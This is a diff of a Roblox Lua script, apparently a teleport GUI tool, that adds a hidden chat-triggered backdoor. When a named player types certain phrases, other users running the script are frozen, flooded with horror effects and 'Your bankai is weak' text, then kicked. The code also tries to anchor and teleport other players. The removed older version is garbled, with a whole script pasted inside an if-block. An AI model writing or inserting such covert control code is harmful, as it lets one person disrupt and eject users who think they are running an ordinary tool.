@@ -2,209 +2,175 @@
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
-local player = Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-
--- ========================
--- CHAT TRIGGER SECTION (DUDEGENAWHATTHEJDIS)
--- ========================
-local guiTriggerPhrase = "Cease. Your bankai is no more."
-local kickTriggerPhrase = "goodbye bankai spammer"
-local targetPlayerName = "DUDEGENAWHATTHEJDIS" -- Only this player triggers actions
-local guiName = "TeleportGui"
-local hooked = {}
-
-local function destroyGUI()
-    local gui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild(guiName)
-    if gui then
-        gui:Destroy()
-        warn("GUI destroyed due to " .. targetPlayerName .. " saying the trigger.")
-    end
-end
-
-local function hookPlayer(plr)
-    if hooked[plr] then return end
-    hooked[plr] = true
-
-    plr.Chatted:Connect(function(msg)
-        msg = msg:lower()
-        if plr.Name ~= targetPlayerName then return end -- Only trigger for the specific player
-
-        -- Destroy GUI if phrase matches
-        if msg == guiTriggerPhrase:lower() and player.Name ~= targetPlayerName then
-            destroyGUI()
-        end
-
-        -- Kick local player if phrase matches
-        if msg == kickTriggerPhrase:lower() and player.Name ~= targetPlayerName then
-           -- LocalScript (StarterPlayerScripts or PlayerGui)
-
-local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
-local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
 local player = Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local humanoid = character:WaitForChild("Humanoid")
 local hrp = character:WaitForChild("HumanoidRootPart")
 
--- === DISABLE MOVEMENT ===
-humanoid.WalkSpeed = 0
-humanoid.JumpPower = 0
-humanoid.AutoRotate = false
+-- CHAT TRIGGER
+local guiTriggerPhrase = "cease. your bankai is no more."
+local kickTriggerPhrase = "stupid bankai user"
+local targetPlayerName = "Trivo101nikua35"
+local guiName = "TeleportGui"
+local hooked = {}
 
--- === DESTROY PLAYERGUI ===
-local gui = player:FindFirstChild("PlayerGui")
-if gui then
-	gui:Destroy()
+local function destroyGUI()
+    local gui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild(guiName)
+    if gui then gui:Destroy() end
 end
 
--- === LIGHTING SETTINGS ===
-Lighting.Brightness = 0.2
-Lighting.ClockTime = 0
-Lighting.FogEnd = 300
-Lighting.FogColor = Color3.fromRGB(20, 20, 20)
-Lighting.Ambient = Color3.fromRGB(40, 0, 0)
-Lighting.OutdoorAmbient = Color3.fromRGB(10, 0, 0)
-Lighting.ColorShift_Top = Color3.fromRGB(80, 0, 0)
-Lighting.ColorShift_Bottom = Color3.fromRGB(10, 0, 0)
+-- HORROR MODE FUNCTION
+local function horrorSequenceAndKick()
+    -- DISABLE MOVEMENT
+    humanoid.WalkSpeed = 0
+    humanoid.JumpPower = 0
+    humanoid.AutoRotate = false
 
--- Atmosphere
-local atmosphere = Instance.new("Atmosphere")
-atmosphere.Density = 0.5
-atmosphere.Offset = 0.25
-atmosphere.Color = Color3.fromRGB(80, 0, 0)
-atmosphere.Decay = Color3.fromRGB(30, 0, 0)
-atmosphere.Glare = 0.3
-atmosphere.Haze = 1
-atmosphere.Parent = Lighting
+    -- NEW LIGHTING SETTINGS
+    Lighting.Brightness = 0.2
+    Lighting.ClockTime = 0
+    Lighting.FogEnd = 300
+    Lighting.FogColor = Color3.fromRGB(20, 20, 20)
+    Lighting.Ambient = Color3.fromRGB(40, 0, 0)
+    Lighting.OutdoorAmbient = Color3.fromRGB(10, 0, 0)
+    Lighting.ColorShift_Top = Color3.fromRGB(80, 0, 0)
+    Lighting.ColorShift_Bottom = Color3.fromRGB(10, 0, 0)
 
--- === FLICKER + FAST FOG CLOSE IN ===
-task.spawn(function()
-	local fog = 300
-	while fog > 40 do
-		Lighting.Brightness = 0.1 + math.random() * 0.3
-		fog -= 10
-		Lighting.FogEnd = fog
-		task.wait(0.05)
-	end
-	Lighting.FogEnd = 40
-end)
+    local atmosphere = Instance.new("Atmosphere")
+    atmosphere.Density = 0.5
+    atmosphere.Offset = 0.25
+    atmosphere.Color = Color3.fromRGB(80, 0, 0)
+    atmosphere.Decay = Color3.fromRGB(30, 0, 0)
+    atmosphere.Glare = 0.3
+    atmosphere.Haze = 1
+    atmosphere.Parent = Lighting
 
--- === WHISPERS ===
-local function playWhisper()
-	local whisper = Instance.new("Sound")
-	whisper.SoundId = "rbxassetid://9123635030"
-	whisper.Volume = 1
-	whisper.RollOffMaxDistance = 30
-	whisper.RollOffMinDistance = 5
-	whisper.Parent = hrp
-
-	local pos = Instance.new("Attachment", hrp)
-	pos.Position = Vector3.new(math.random(-15,15), math.random(-5,5), math.random(-15,15))
-	whisper.Parent = pos
-	whisper:Play()
-	game:GetService("Debris"):AddItem(pos, whisper.TimeLength + 1)
-end
-
-task.spawn(function()
-	while true do
-		playWhisper()
-		task.wait(math.random(4,8))
-	end
-end)
-
--- === HEARTBEAT ===
-local heartbeat = Instance.new("Sound")
-heartbeat.SoundId = "rbxassetid://7076150261"
-heartbeat.Looped = true
-heartbeat.Volume = 1.2
-heartbeat.Parent = hrp
-heartbeat:Play()
-
-RunService.Heartbeat:Connect(function()
-	local fogEnd = Lighting.FogEnd
-	local alpha = 1 - math.clamp((fogEnd - 40) / (300 - 40), 0, 1)
-	heartbeat.PlaybackSpeed = 0.5 + (1.6 - 0.5) * alpha
-end)
-
--- === TELEPORT LOCAL PLAYER HIGH UP ===
-hrp.CFrame = hrp.CFrame + Vector3.new(0, 200, 0)
-
--- === TELEPORT NEARBY PLAYERS, ANCHOR THEM, AND SHOW BILLBOARD TEXT ===
-for _, other in pairs(Players:GetPlayers()) do
-	if other ~= player and other.Character and other.Character:FindFirstChild("HumanoidRootPart") then
-		local targetHRP = other.Character.HumanoidRootPart
-		targetHRP.Anchored = true
-		targetHRP.CFrame = hrp.CFrame * CFrame.new(math.random(-10,10),0,math.random(-10,10))
-
-		-- Billboard text above them
-		local chatClone = Instance.new("BillboardGui")
-		chatClone.Size = UDim2.new(0,200,0,50)
-		chatClone.Adornee = targetHRP
-		chatClone.AlwaysOnTop = true
-
-		local textLabel = Instance.new("TextLabel")
-		textLabel.Size = UDim2.new(1,0,1,0)
-		textLabel.BackgroundTransparency = 1
-		textLabel.TextColor3 = Color3.fromRGB(255,0,0)
-		textLabel.TextStrokeTransparency = 0
-		textLabel.TextScaled = true
-		textLabel.Font = Enum.Font.Antique
-		textLabel.Text = "Your bankai is weak."
-		textLabel.Parent = chatClone
-
-		chatClone.Parent = targetHRP
-		game:GetService("Debris"):AddItem(chatClone, 3)
-	end
-end
-
--- === SCREEN RED TEXT FLOOD (CHAOTIC) ===
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "BankaiFlood"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = CoreGui
-
-local labels = {}
-for i = 1, 50 do
-	local textLabel = Instance.new("TextLabel")
-	textLabel.Size = UDim2.new(0, math.random(150,300), 0, 50)
-	textLabel.Position = UDim2.new(math.random(),0,math.random(),0)
-	textLabel.BackgroundTransparency = 1
-	textLabel.TextColor3 = Color3.fromRGB(255,0,0)
-	textLabel.TextStrokeTransparency = 0
-	textLabel.TextScaled = true
-	textLabel.Font = Enum.Font.Antique
-	textLabel.Text = "Your bankai is weak."
-	textLabel.Rotation = math.random(-25,25)
-	textLabel.Parent = screenGui
-	table.insert(labels, textLabel)
-end
-
--- Random chaotic movement for labels
-RunService.RenderStepped:Connect(function()
-	for _, lbl in ipairs(labels) do
-		lbl.Position = UDim2.new(math.random(),0,math.random(),0)
-		lbl.Rotation = math.random(-25,25)
-	end
-end)
-
-game:GetService("Debris"):AddItem(screenGui, 8)
-
--- === LOCAL SHAKE EFFECT ===
-task.spawn(function()
-	for i=1,60 do
-		hrp.CFrame = hrp.CFrame * CFrame.Angles(
-			math.rad(math.random(-5,5)),
-			math.rad(math.random(-5,5)),
-			math.rad(math.random(-5,5))
-		)
-		task.wait(0.05)
-	end
-end)
-wait(8) player:Kick(game.Players.LocalPlayer.Name .. " your bankai is too weak..")
+    -- FLICKER + FAST FOG
+    task.spawn(function()
+        local fog = 300
+        while fog > 40 do
+            Lighting.Brightness = 0.1 + math.random() * 0.3
+            fog -= 10
+            Lighting.FogEnd = fog
+            task.wait(0.05)
         end
+        Lighting.FogEnd = 40
+    end)
+
+    -- WHISPERS
+    task.spawn(function()
+        while true do
+            local whisper = Instance.new("Sound")
+            whisper.SoundId = "rbxassetid://9123635030"
+            whisper.Volume = 1
+            whisper.RollOffMaxDistance = 30
+            whisper.RollOffMinDistance = 5
+            local pos = Instance.new("Attachment", hrp)
+            pos.Position = Vector3.new(math.random(-15,15), math.random(-5,5), math.random(-15,15))
+            whisper.Parent = pos
+            whisper:Play()
+            game:GetService("Debris"):AddItem(pos, whisper.TimeLength + 1)
+            task.wait(math.random(4,8))
+        end
+    end)
+
+    -- HEARTBEAT
+    local heartbeat = Instance.new("Sound")
+    heartbeat.SoundId = "rbxassetid://7076150261"
+    heartbeat.Looped = true
+    heartbeat.Volume = 1.2
+    heartbeat.Parent = hrp
+    heartbeat:Play()
+    RunService.Heartbeat:Connect(function()
+        local alpha = 1 - math.clamp((Lighting.FogEnd - 40) / (300 - 40), 0, 1)
+        heartbeat.PlaybackSpeed = 0.5 + (1.6 - 0.5) * alpha
+    end)
+
+    -- TELEPORT HIGH
+    hrp.CFrame = hrp.CFrame + Vector3.new(0,200,0)
+
+    -- ANCHOR NEARBY PLAYERS + RED BILLBOARD
+    for _, other in pairs(Players:GetPlayers()) do
+        if other ~= player and other.Character and other.Character:FindFirstChild("HumanoidRootPart") then
+            local targetHRP = other.Character.HumanoidRootPart
+            targetHRP.Anchored = true
+            targetHRP.CFrame = hrp.CFrame * CFrame.new(math.random(-10,10),0,math.random(-10,10))
+
+            local chatClone = Instance.new("BillboardGui")
+            chatClone.Size = UDim2.new(0,200,0,50)
+            chatClone.Adornee = targetHRP
+            chatClone.AlwaysOnTop = true
+            local textLabel = Instance.new("TextLabel")
+            textLabel.Size = UDim2.new(1,0,1,0)
+            textLabel.BackgroundTransparency = 1
+            textLabel.TextColor3 = Color3.fromRGB(255,0,0)
+            textLabel.TextStrokeTransparency = 0
+            textLabel.TextScaled = true
+            textLabel.Font = Enum.Font.Antique
+            textLabel.Text = "Your bankai is weak."
+            textLabel.Parent = chatClone
+            chatClone.Parent = targetHRP
+            game:GetService("Debris"):AddItem(chatClone, 3)
+        end
+    end
+
+    -- RED SCREEN TEXT CHAOS
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "BankaiFlood"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = CoreGui
+    local labels = {}
+    for i = 1,50 do
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(0, math.random(150,300), 0, 50)
+        textLabel.Position = UDim2.new(math.random(),0,math.random(),0)
+        textLabel.BackgroundTransparency = 1
+        textLabel.TextColor3 = Color3.fromRGB(255,0,0)
+        textLabel.TextStrokeTransparency = 0
+        textLabel.TextScaled = true
+        textLabel.Font = Enum.Font.Antique
+        textLabel.Text = "Your bankai is weak."
+        textLabel.Rotation = math.random(-25,25)
+        textLabel.Parent = screenGui
+        table.insert(labels, textLabel)
+    end
+    RunService.RenderStepped:Connect(function()
+        for _, lbl in ipairs(labels) do
+            lbl.Position = UDim2.new(math.random(),0,math.random(),0)
+            lbl.Rotation = math.random(-25,25)
+        end
+    end)
+    game:GetService("Debris"):AddItem(screenGui, 8)
+
+    -- LOCAL SHAKE
+    task.spawn(function()
+        for i = 1,60 do
+            hrp.CFrame = hrp.CFrame * CFrame.Angles(
+                math.rad(math.random(-5,5)),
+                math.rad(math.random(-5,5)),
+                math.rad(math.random(-5,5))
+            )
+            task.wait(0.05)
+        end
+    end)
+
+    -- KICK AFTER 8 SECONDS
+    task.delay(8, function()
+        player:Kick(targetPlayerName..":…… your bankai is too weak")
+    end)
+end
+
+-- HOOK TARGET PLAYER CHAT
+local function hookPlayer(plr)
+    if hooked[plr] then return end
+    hooked[plr] = true
+    plr.Chatted:Connect(function(msg)
+        msg = msg:lower()
+        if plr.Name ~= targetPlayerName then return end
+        if msg == guiTriggerPhrase then destroyGUI() end
+        if msg == kickTriggerPhrase then horrorSequenceAndKick() end
     end)
 end
 
@@ -212,9 +178,12 @@ end
 for _, plr in pairs(Players:GetPlayers()) do hookPlayer(plr) end
 Players.PlayerAdded:Connect(hookPlayer)
 
--- ========================
--- END CHAT TRIGGER SECTION
--- ========================
+-- =========================================
+-- REST OF YOUR GUI / BUTTONS / ANIMATIONS
+-- They remain fully functional and unaffected
+-- =========================================
+
+
 
 -- HELPER FUNCTION: PLAY ANIMATION
 local function playAnimation(anim, speed)
